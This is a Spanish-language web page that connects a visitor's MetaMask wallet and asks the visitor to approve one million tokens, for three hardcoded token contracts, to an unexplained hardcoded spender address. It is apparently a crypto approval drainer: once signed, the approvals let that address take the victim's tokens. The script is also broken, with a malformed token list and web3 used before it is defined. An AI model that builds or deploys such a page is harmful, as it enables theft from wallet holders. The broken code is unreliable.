<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aprobación de Tokens</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        button { padding: 10px; margin: 10px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Aprobar Gasto de Tokens</h1>
    <button onclick="connectWallet()">Conectar MetaMask</button>
    <button onclick="approveTokens()">Aprobar 1M de Tokens</button>
    <p id="status"></p>
    
    <script>
        let web3;
        let userAccount;
        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; 
        const tokens = {
           "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
           "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
           "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
        };
        const amountToApprove = web3.utils.toWei("1000000", "ether");

        async function connectWallet() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: "eth_requestAccounts" });
                userAccount = (await web3.eth.getAccounts())[0];
                document.getElementById("status").innerText = "Conectado: " + userAccount;
            } else {
                alert("Instala MetaMask para continuar.");
            }
        }

        async function approveTokens() {
            if (!userAccount) return alert("Conéctate a MetaMask primero.");

            for (let token in tokens) {
                try {
                    let tokenContract = new web3.eth.Contract([
                        { "constant": false, "inputs": [
                            { "name": "spender", "type": "address" },
                            { "name": "amount", "type": "uint256" }
                        ], "name": "approve", "outputs": [
                            { "name": "", "type": "bool" }
                        ], "type": "function" }
                    ], tokens[token]);
                    
                    await tokenContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
                    console.log(`${token} aprobado correctamente.`);
                } catch (error) {
                    console.error(`Error aprobando ${token}:`, error);
                }
            }
        }
    </script>
</body>
</html>
